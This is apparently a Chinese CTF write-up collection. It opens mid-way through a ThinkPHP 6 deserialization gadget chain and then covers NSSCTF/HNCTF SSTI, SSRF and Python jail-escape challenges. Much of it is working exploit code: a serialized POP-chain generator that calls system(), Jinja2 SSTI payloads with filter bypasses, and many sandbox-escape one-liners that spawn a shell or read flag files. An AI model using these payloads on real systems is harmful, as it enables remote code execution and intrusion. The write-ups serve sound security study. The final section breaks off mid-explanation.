那就只需要让`$this->data`不为空就可以了。跳过了上面的if语句判断，来到`$result = $this->exists ? $this->updateData() : $this->insertData($sequence);`三元运算符，这里的意思是`$this->exists`为true就执行`$this->updateData()`，为false执行`$this->insertData($sequence)`，`$this->exists`是可控的，先跟进`updateData()`
```php
    protected function updateData(): bool
    {
        // 事件回调
        if (false === $this->trigger('BeforeUpdate')) {
            return false;
        }
        $this->checkData();
        // 获取有更新的数据
        $data = $this->getChangedData();
        if (empty($data)) {
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
            return true;
        }
        if ($this->autoWriteTimestamp && $this->updateTime) {
            // 自动写入更新时间
            $data[$this->updateTime]       = $this->autoWriteTimestamp();
            $this->data[$this->updateTime] = $data[$this->updateTime];
        }
        // 检查允许字段
        $allowFields = $this->checkAllowFields();
        foreach ($this->relationWrite as $name => $val) {
            if (!is_array($val)) {
                continue;
            }
            foreach ($val as $key) {
                if (isset($data[$key])) {
                    unset($data[$key]);
                }
            }
        }
        // 模型更新
        $db = $this->db();
        $db->transaction(function () use ($data, $allowFields, $db) {
            $this->key = null;
            $where     = $this->getWhere();
            $result = $db->where($where)
                ->strict(false)
                ->cache(true)
                ->setOption('key', $this->key)
                ->field($allowFields)
                ->update($data);
            $this->checkResult($result);
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
        });
        // 更新回调
        $this->trigger('AfterUpdate');
        return true;
    }
```
跟刚才绕过`trigger`一样，第二个if要传入非空的data，就可以走到`$allowFields = $this->checkAllowFields();`，而data是`$this->getChangedData()`赋值得来，跟进
```php
public function getChangedData(): array
    {
        $data = $this->force ? $this->data : array_udiff_assoc($this->data, $this->origin, function ($a, $b) {
            if ((empty($a) || empty($b)) && $a !== $b) {
                return 1;
            }
            return is_object($a) || $a != $b ? 1 : 0;
        });
        // 只读字段不允许更新
        foreach ($this->readonly as $key => $field) {
            if (array_key_exists($field, $data)) {
                unset($data[$field]);
            }
        }
        return $data;
    }
```
`$this->force`为true则执行`$this->data`，force默认为false，会执行后面的`array_udiff_assoc()`，就是用下面的自定义函数来比较`$this->data`和`$this->origin`，而两者默认是null，过不了`&& $a !== $b`的判断，所以会进入`return is_object($a) || $a != $b ? 1 : 0;`，最终会返回0，会把这个0赋给`$data`，为非空值，成功进入了`$allowFields = $this->checkAllowFields();`，跟进
```php
protected function checkAllowFields(): array
    {
        // 检测字段
        if (empty($this->field)) {
            if (!empty($this->schema)) {
                $this->field = array_keys(array_merge($this->schema, $this->jsonType));
            } else {
                $query = $this->db();
                $table = $this->table ? $this->table . $this->suffix : $query->getTable();
                $this->field = $query->getConnection()->getTableFields($table);
            }
            return $this->field;
        }
        $field = $this->field;
        if ($this->autoWriteTimestamp) {
            array_push($field, $this->createTime, $this->updateTime);
        }
        if (!empty($this->disuse)) {
            // 废弃字段
            $field = array_diff($field, $this->disuse);
        }
        return $field;
    }
```
`$this->field`是空的，会执行下面的else分支也就是`$this->db()`，跟进,
`$this->table`可控，能够进入到if里，由于用了`.`来拼接`$this->table`和`$this->suffix`，也就是把这两个变量当做字符串来处理，倘若传入对象，则会触发`__toString()`，因此现在可以寻找`__toString()`了,在`www/vendor/topthink/think-orm/src/model/concern/Conversion.php`里的`__toString()`调用了`toJson()`，跟进调用了`toArray()`
```php
public function __toString()
    {
        return $this->toJson();
    }
```

```php
 public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
    {
        return json_encode($this->toArray(), $options);
    }
```

```php
public function toArray(): array
    {
        $item       = [];
        $hasVisible = false;
        foreach ($this->visible as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    [$relation, $name]          = explode('.', $val);
                    $this->visible[$relation][] = $name;
                } else {
                    $this->visible[$val] = true;
                    $hasVisible          = true;
                }
                unset($this->visible[$key]);
            }
        }
        foreach ($this->hidden as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    [$relation, $name]         = explode('.', $val);
                    $this->hidden[$relation][] = $name;
                } else {
                    $this->hidden[$val] = true;
                }
                unset($this->hidden[$key]);
            }
        }
```
`$data = array_merge($this->data, $this->relation);`这一句将两个数组合并，接下来遍历，中间用到`getAttr()`函数，跟进
```php
 public function getAttr(string $name)
    {
        try {
            $relation = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation = $this->isRelationAttr($name);
            $value    = null;
        }
        return $this->getValue($name, $value, $relation);
    }
```
`$relation`默认是false的，`$value`从`getData()`获取，然后传到`getValue()`，跟进`getData()`看看
```php
public function getData(string $name = null)
    {
        if (is_null($name)) {
            return $this->data;
        }
        $fieldName = $this->getRealFieldName($name);
        if (array_key_exists($fieldName, $this->data)) {
            return $this->data[$fieldName];
        } elseif (array_key_exists($fieldName, $this->relation)) {
            return $this->relation[$fieldName];
        }
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
```
里面调用的`getRealFieldName`跟利用链关系不大，看`getValue()`
```php
protected function getValue(string $name, $value, $relation = false)
    {
        // 检测属性获取器
        $fieldName = $this->getRealFieldName($name);
        if (array_key_exists($fieldName, $this->get)) {
            return $this->get[$fieldName];
        }
        $method = 'get' . Str::studly($name) . 'Attr';
        if (isset($this->withAttr[$fieldName])) {
            if ($relation) {
                $value = $this->getRelationValue($relation);
            }
```
`$this->withAttr`存在于且为数组，`$fieldName`在`$this->json`中存在就能执行`getJsonValue`，跟进
```php
protected function getJsonValue($name, $value)
    {
        if (is_null($value)) {
            return $value;
        }
        foreach ($this->withAttr[$name] as $key => $closure) {
            if ($this->jsonAssoc) {
                $value[$key] = $closure($value[$key], $value);
            } else {
                $value->$key = $closure(
                $value->$key, $value);
            }
        }
        return $value;
    }
```
变量覆盖RCE，控制`$this->jsonAssoc`为true即可利用、
到这里整理一下链子
```
Conversion::__toString() 
Conversion::toJson() 
Conversion::toArray() //$this->data 
Attribute::getAttr() 
Attribute::getValue() //$this->json 
$this->withAttr 
Attribute::getJsonValue()
```
data是可控的，如果控制data为`$this->data=['whoami'=>['whoami']]`，经过foreach传入`Attribute::getAttr()`，key就是whoami
```php
public function toArray(): array { ... // 合并关联数据 
$data = array_merge($this->data, $this->relation); //$this->data=['whoami'=>['whoami']] 
foreach ($data as $key => $val) { ... // 关联模型对象 
if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) { $item[$key] = $val->toArray(); } } 
elseif (isset($this->visible[$key])) { 
$item[$key] = $this->getAttr($key); } 
elseif (!isset($this->hidden[$key]) && !$hasVisible) 
{ $item[$key] = $this->getAttr($key);//$key=whoami 
} ... 
}
```
`getAttr()`里用的是`getData()`来获取数组value的，刚才我们控制了data为键值对，`key`是`whoami`，值是`['whoami']`，最终`$value=['whoami']`，刚才说了`$this->withAttr`存在且为数组，`$fieldName`在`$this->json`中存在就能执行`getJsonValue`
```php
        if (isset($this->withAttr[$fieldName])) {
            if ($relation) {
                $value = $this->getRelationValue($relation);
            }
            if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
                $value = $this->getJsonValue($fieldName, $value);
```
控制`$this->withAttr=['whoami'=>['system']]`，`$this->json=['whoami']`，进入最后的`getJsonValue()`：
```php
    protected function getJsonValue($name, $value)
    {
        if (is_null($value)) {
            return $value;
        }
        foreach ($this->withAttr[$name] as $key => $closure) {
            if ($this->jsonAssoc) {
                $value[$key] = $closure($value[$key], $value);
            } else {
                $value->$key = $closure($value->$key, $value);
            }
        }
        return $value;
    }
```
`$name='whaomi,$value=['whoami'],$this->withAttr[$name]=['system']`
poc构造的角度结束，来看exp构造(`__destruct()`利用过程)
```
Model::__destruct()
Model::save()
Model::updateData()
Model::checkAllowFields()
Model::db()  //__toString()
```

```php
    public function __destruct()
    {
        if ($this->lazySave) { //控制$this->lazySave=true
            $this->save();
        }
    }
```

```php
        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) { //$this->data非空即可
            return false;
        }
        $result = $this->exists ? $this->updateData() : $this->insertData($sequence); //控制$this->exists为true
```
然后到`Model::db()`
```php
    public function db($scope = []): Query
    {
        /** @var Query $query */
        $query = self::$db->connect($this->connection)
            ->name($this->name . $this->suffix)
            ->pk($this->pk);

        if (!empty($this->table)) {
            $query->table($this->table . $this->suffix);
        }//控制$this->talbe为实例化的对象当做字符串调用触发__toString()
...
    }
```
Model是抽象类，利用了我们涉及到的`Attribute`和`Conversion`接口，关键字可以直接使用
```php
abstract class Model implements JsonSerializable, ArrayAccess, Arrayable, Jsonable
{
    use model\concern\Attribute;
    use model\concern\RelationShip;
    use model\concern\ModelEvent;
    use model\concern\TimeStamp;
    use model\concern\Conversion;

```
寻找一个可以被实例化的Model子类开始构造exp
```php
<?php
namespace think {
    abstract class Model
    {
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;
        function __construct($obj = '')
        {
            $this->lazySave = True;
            $this->data = ['whoami' => ['cat /nssctfflag']];#  这里需要自己进行更改！！！
            $this->exists = True;
            $this->table = $obj;
            $this->withAttr = ['whoami' => ['system']];
            $this->json = ['whoami', ['whoami']];
            $this->jsonAssoc = True;
        }
    }
}
namespace think\model {
    use think\Model;
    class Pivot extends Model
    {
    }
}
namespace {
    echo (urlencode(serialize(new think\model\Pivot(new think\model\Pivot()))));
}
```

因为有一个index.php文件里有
```php
class Index extends BaseController

{
    public function index()

    {
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V' . \think\facade\App::version() . '<br/><span style="font-size:30px;">14载初心不改 - 你值得信赖的PHP框架</span></p><span style="font-size:25px;">[ V6.0 版本由 <a href="https://www.yisu.com/" target="yisu">亿速云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ee9b1aa918103c4fc"></think>';

    }
    public function hello($name = 'ThinkPHP6')
    {
        return 'hello,' . $name;
    }
    public function test()
    {
    unserialize($_POST['a']);
    }
}
```
所以在题目的Index.php中存在一个test路由，里面反序列化了post参数a，传入即可
在/index/test
![图片](./image/14.png)
得到flag
## `[HNCTF 2022 WEEK2]ez_SSTI`

直接用脚本
```python
import requests  
url=input('请输入url链接:')  
for i in range(500):  
    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}#name可能需要根据实际情况变更  
    try:  
        response=requests.get(url,params=data)  
        #print(response.text)  
        if response.status_code == 200:  
            if '_frozen_importlib_external.FileLoader' in response.text:  
                print(i)  
                data1 = {"name":"{{().__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat flag')\").read()}}"}  
                response1 = requests.get(url, params=data1)  
                print(response1.text)  
    except:  
        pass
```
得到flag![](./image/68.png)
## `[HNCTF 2022 WEEK3]ssssti`
可以测试一下，把下划线，单双引号，都过滤了，os字符也过滤了,可以用lipsum和attr绕过下划线和单双引号，用dict和join拼接，下划线可以从{%set a=({}|select()|string()|list)%}{{a}}中取到，下划线是第25个，空格是第11个(后面cat flag时要用到空格),o和s分别是第9，19个，最开始要使用的payload是`{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat flag")|attr("read")()}}`绕过一些过滤得到最终payload如下，最终payloads`{%set a=({}|select()|string()|list)[24]%}{%set space=({}|select()|string()|list)[10]%}{%set o=({}|select()|string()|list)[8]%}{%set s=({}|select()|string()|list)[18]%}{%set globals=(a,a,dict(globals=a)|join,a,a)|join%}{%set getitem=(a,a,dict(getitem=a)|join,a,a)|join%}{%set ls=dict(ls=a)|join%}{%set read=dict(read=a)|join%}{%set so=(o,s)|join%}{%set popen=dict(popen=a)|join%}{%set flag=(dict(cat=a)|join,space,dict(flag=a)|join)|join%}{{lipsum|attr(globals)|attr(getitem)(so)|attr(popen)(flag)|attr(read)()}}`

## `[安洵杯 2020]Normal SSTI`
试一下，把`. _ {{}} [ ]`都过滤了，空格都过滤了，但`{%%}`没过滤，可以用`{%print()%}`,因为`.`和`[]`被过滤，所以使用flask的|attr来调用方法,`''|attr("__class__")`等于`''.__class__`,其他过滤的地方都用unicode编码绕过paylaod`lipsum|attr("__globals__").get("os").popen("ls").read()`,最终paylaod`{%print((lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067")|attr("read")()))%}`
## `[NISACTF 2022]easyssrf`
尝试输入`127.0.0.1/flag`发现一句话`都说了这里看不了flag。。但是可以看看提示文件：/fl4g`试着用file伪协议读取`file:///fl4g`看到`你应该看看除了index.php，是不是还有个ha1x1ux1u.php`可以访问一下`http://node5.anna.nssctf.cn:28287/ha1x1ux1u.php`看到源码
```php
<?php  
  
highlight_file(__FILE__);  
error_reporting(0);  
  
$file = $_GET["file"];  
if (stristr($file, "file")){  
  die("你败了.");  
}  
  
//flag in /flag  
echo file_get_contents($file);
```
看到用不了file伪协议了，但可以用php伪协议读取flag`?file=php://filter/read=convert.base64-encode/resource=/flag`再解码得到flag
## `[HNCTF 2022 WEEK2]ez_ssrf`
看源码
```php
<?php  
  
highlight_file(__FILE__);  
error_reporting(0);  
  
$data=base64_decode($_GET['data']);  
$host=$_GET['host'];  
$port=$_GET['port'];  
  
$fp=fsockopen($host,intval($port),$error,$errstr,30);  
if(!$fp) {  
    die();  
}  
else {    fwrite($fp,$data);  
    while(!feof($data))  
    {  
        echo fgets($fp,128);  
    }    fclose($fp);  
}
```
扫目录可以看到一个flag.php，访问啥也得不到，可以
## [HNCTF 2022 Week1]calc_jail_beginner(JAIL)
直接nc连接，看源码没有任何过滤，直接交给`eval()`了。
```
__import__('os').popen('cat /home/ctf/flag').read()
```
可以得到flag
## [HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)
这一关过滤了
```
' " ` i b
```
就可以用ascii码构造路径。
不可以用`import`了，就直接open用chr()函数拼接（这个前提是知道flag路径）
```
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```
也可以复杂一些
渐变过程
```
().__class__.__base__.__subclasses__()
getattr(().__class__, '__base__').__subclasses__()
getattr(getattr(().__class__,'__base__'),'__subclasses__')()
getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()
# 执行这个可以发现os在倒数第四
接下来就是
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh')
getattr(getattr(getattr(getattr(().__class__,'__base__'),'__subclasses__')()[-4],'__init__'),'__globals__')['system']('sh')

getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))

```
这样就进了交互式界面。
再`ls cat flag`就行了。

## [HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)
这一关限制了长度<=13
而`open('flag').read()`的长度就超了，
可以用input拼接   
```
> eval(input()) # 长度刚好13
__import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ cat flag
flag=NSSCTF{16c09b84-f724-4b32-9ed6-b94adcc73b6a}
$
```
## [HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)
这一关更狠，限长为7，这里了解到在python交互式终端可以利用`help()`进行RCE。
参考https://ptr-yudai.hatenablog.com/entry/2021/12/19/232158#Misc-227pts-hitchhike
在 Python 中，! 符号通常被用于 Jupyter Notebook 或类似的交互式环境中，用来执行系统命令，而help()正是个能交互式的界面
```
help()

os

!cat flag
```
输入`help()`，进入到help界面，然后随便找个模块，例如`os`输入，此时就会显示`os`模块的帮助页面，输入`!cat flag`就能能rce。
## [HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)
这一关ban了`"exec","input","eval"`并且长度还是限制为13。
先通过help()确定python版本是3.10。
Python中内置了一个名为breakpoint()的函数，在Python 3.7中引入，用于在调试模式下设置断点。使用breakpoint()函数会停止程序的执行，并在IDE或命令行中进入调试模式，可以单步执行程序，查看变量的值等。
执行breakpoint()就会进入`Pdb`
pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。
```
breakpoint()
__import__('os').popen('cat flag').read()
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)
源码
```python
BANLIST = ['__loader__', '__import__', 'compile', 'eval', 'exec', 'chr']  
  
eval_func = eval  
  
for m in BANLIST:  
    del __builtins__.__dict__[m]  
  
del __loader__, __builtins__  
  
def filter(s):  
    not_allowed = set('"\'`')  
    return any(c in not_allowed for c in s)
```
过滤了`'__loader__', '__import__', 'compile', 'eval', 'exec', 'chr'`
和
```
' " ` 
```
chr被ban了，可以用`bytes([]).decode()`
如果知道flag路径的话直接
```
open(bytes([102,108,97,103]).decode()).read()
```
如果不知道
```
().__class__.__base__.__subclasses__()[137].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())
```
这样就可以rce了。
## [HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)
如果把bytes给ban了，
dir()可以看到
```
['__builtins__', 'my_flag']
```
再
```
str().join(my_flag.flag_level5)
```
可以得到flag
或者可以
```
().__class__.__base__.__subclasses__()
```
看到bytes在第七个，索引值为6
```
().__class__.__base__.__subclasses__()[137].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
```
## [HNCTF 2022 Week1]lake lake lake(JAIL)
`globals()` 方法返回一个字典，其中包含了当前模块中所有全局变量的键值对
```
1
globals()
可以看到一个key
这时再
2
a34af94e88aed5c34fb5ccfe08cd14ab
__import__('os').system('sh')
```
## [HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)
func限长为6,只能用help()了
help()配合__main__查看当前模块的值
```
help()

main()
```
可以拿到一个key，用这个key进入backdoor
```
__import__('os').system('sh')
```
## [HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)
给到源码
```python
BLACKED_LIST = ['compile', 'eval', 'exec', 'open']
BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'})
```
这里要用到# python的sys.stdout重定向
https://blog.csdn.net/MTbaby/article/details/53159053
```
以下两行在事实上等价： 
sys.stdout.write('hello'+'\n') 
print 'hello'
```

```
以下两组在事实上等价： 
hi=raw_input('hello? ') 

print 'hello? ',
hi=sys.stdin.readline()[:-1]
```
可以用`__import__("sys").__stdout__.write()`来替代`print()` 输出
payload
```
__import__("sys").__stdout__.write(__import__("os").read(__import__("os").open("flag",__import__("os").O_RDONLY), 0x114).decode())
```
源码里是`input_data = eval_func(input(''),{},{})`传入了空的全局 / 局部变量，但 `__import__` 是**Python 内置的特殊函数**（不属于 `__builtins__` 可删除的范畴），即使环境为空也能调用；
这是以只读模式读取flag，并且读前0x114个字符，这样直接就执行并且打印出来了，就不用关那个猜数字的游戏了。
源码里这一句
```python
sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout
```
它把print的内容，源码里没有过滤了`os.read`和`os.open`
也可以顺着这个猜数字的思路来，
此处随机数的生成是采用`random.randint`来产生的。python的`random`模块使用梅森旋转法来生成随机数。由于程序未限制我们拿到`random`模块，所以我们可以先拿到`random`模块，再`random.getstate()`拿到随机数生成器的状态，再通过`random.setstate()`置随机数生成器状态为生成随机数之前的状态，最后`random.randint`生成一模一样的随机数。
但是这就要使用多条语句，eval只可以执行一条语句，在python3.8引入了海象运算符`:=`
在表达式左侧应用海象运算符，可以将该表达式的值赋给某个变量。另外，我们还可以用一个list来装这些表达式，这样表达式的值就会从左至右依次计算，就像我们写程序一样一行一行地执行。对于函数的实现，我们可以借助lambda表达式来完成。
这里我们使用list来写程序，然后把返回值放到最后一个元素，最后再加一个`[-1]`，就能返回随机数了：）
```
[random:=__import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
```
这样就可以拿到flag了。
## [HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)
这个依然可以用上一关预测随机数的方法。
也可以利用到python栈帧的特性，
```
int(str(__import__('sys')._getframe(1).f_locals["right_guesser_question_answer"]))
```
理解栈帧：Python 执行函数时，会为每个函数创建一个 “栈帧对象”，存储函数的执行环境（局部变量、参数、调用关系等）；
在 Python 执行过程中，栈帧（stack frame）是一个关键概念。栈帧代表函数调用的执行环境，包含了函数执行所需的所有信息，包括局部变量、操作数栈、返回地址等。每次函数调用都会创建一个新的栈帧，并将其压入调用栈（call stack）。函数执行完毕后，栈帧会被弹出调用栈。
正确答案在`right_guesser_question_answer`里，
这里要用到`_getframe`函数，它可以获取调用栈的帧对象，默认参数是0，但是在这里传入0的话会获取eval的调用栈帧，所以要deep一层。
```
__import__('sys')._getframe(1)
```
这里可以使用`__import__('sys').__stdout__.write`去进行标准输出，
```
__import__('sys').__stdout__.write(str(__import__('sys')._getframe(1)))
```
可以看到这里的frame对象指向了'/home/ctf/./server.py'这个file，那么直接调用f_locals属性查看变量  
```
__import__('sys').__stdout__.write(str(__import__('sys')._getframe(1).f_locals))
```
可以看到`right_guesser_question_answer`。所以最后payload是
```
int(str(__import__('sys')._getframe(1).f_locals["right_guesser_question_answer"]))
```
## [HNCTF 2022 WEEK2]4 byte command
限长为4字符。
直接
```
sh
```


## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)
解法一
利用type获取bytes
```python
print(type(str(1).encode()))
```
输出`<class 'bytes'>`
```python
print((type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode())
```
输出`system`
所以payload
```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())
```
解法二
```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
```
解法三
利用`__doc__`凑字符。
```python
print(().__doc__) 
```
输出
```
Built-in immutable sequence.

If no argument is given, the constructor returns an empty tuple.
If iterable is specified the tuple is initialized from iterable's items.

If the argument is a tuple, the return value is the same object.
```
所以`print(().__doc__[19])`就是`s`，从这里把需要的字符一个一个找出来。

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)
用上一关的解法二依然可以用，
这一关的加号和`byte`都禁了，我们用`.__add__`来替换加号，依然用上一关
```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode())
```
这一关也可以用`__doc__`的方法，但除了用`+`拼接，还有其他的方法，
如字符串`1234`可以用这种方法得到
```
print(''.join(['1','2','3','4']))
```
这里的`''`可以用`str()`代替，
```
print(str().join(['1','2','3','4']))
```
最终payload
```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)
这一关过滤了`type`
还有一种获取字符的方法
```
print(list(dict(system=123))[0])
```
这样可以获取`system`这个字符串，
payload
```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)
提示用`dir()`
```
> dir()  
['__builtins__', 'my_flag']  
```
看到有个my_flag，使用dir跟进  
```
> dir(my_flag)
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'flag_level5']
```
看到一个flag_level5  
继续跟进
```
> dir(my_flag.flag_level5)  
```
发现有个encode()方法。直接调用
```
my_flag.flag_level5.encode()  
```
## [HNCTF 2022 WEEK3]s@Fe safeeval(JAIL)  
```
Turing s@Fe mode: on  
Black List:  
  
[  
'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP',  
'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET',  
'BUILD_CONST_KEY_MAP', 'BUILD_STRING','LOAD_CONST','RETURN_VALUE',  
'STORE_SUBSCR', 'STORE_MAP','LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE',  
'DICT_UPDATE', 'DICT_MERGE','UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT',  
'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY','BINARY_DIVIDE','BINARY_FLOOR_DIVIDE',  
'BINARY_TRUE_DIVIDE','BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT','BINARY_LSHIFT',  
'BINARY_RSHIFT','BINARY_AND','BINARY_XOR','BINARY_OR','MAKE_FUNCTION', 'CALL_FUNCTION'  
]  
  
some code:  
  
import os  
import sys  
import traceback  
import pwnlib.util.safeeval as safeeval  
input_data = input('> ')  
print(expr(input_data))  
def expr(n):  
if TURING_PROTECT_SAFE:  
m = safeeval.test_expr(n, blocklist_codes)  
return eval(m)  
else:  
return safeeval.expr(n) 
``` 
给了部分代码，Black List ban掉了一些Python 字节码操作，这些操作大多与数据结构的修改、函数的创建和调用等功能相关。

但代码中真正起过滤作用的是pwnlib.util.safeeval，与BlackList相比仁慈地放出了MAKE_FUNCTION和CALL_FUNCTION两个字节码
所以直接用`lambda`表达式直接打匿名函数。
```
(lambda:__import__('os').system('sh'))()
```
## [HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL)  

这题已经几乎把所有的hook给ban掉了。所以我们只能另寻他法。
参考wp https://ctftime.org/writeup/31883
也就是利用`_posixsubprocess.fork_exec`来RCE。不过这里需要注意到，不同的python版本的`_posixsubprocess.fork_exec`接受的参数个数可能不一样：例如我本地WSL的python版本为3.8.10，该函数接受17个参数；而远程python版本为3.10.6，该函数和上面的writeup接受21个参数。
而且注意到，如果我们直接`import _posixsubprocess`，会触发audit hook：

```text
Operation not permitted: import
```
但可以利用这个绕过
```
__builtins__['__loader__'].load_module('_posixsubprocess')
```
或者直接
```
__loader__.load_module('_posixsubprocess')
```
而且因为是多次`exec`，所以我们可以输入多行代码：
```py
import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
```
## [HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(JAIL)
这一关和上一关不同的是这一关只可以一次代码执行的机会，
这可以用python3.8引入的海象运算符和list弄出代码。
```
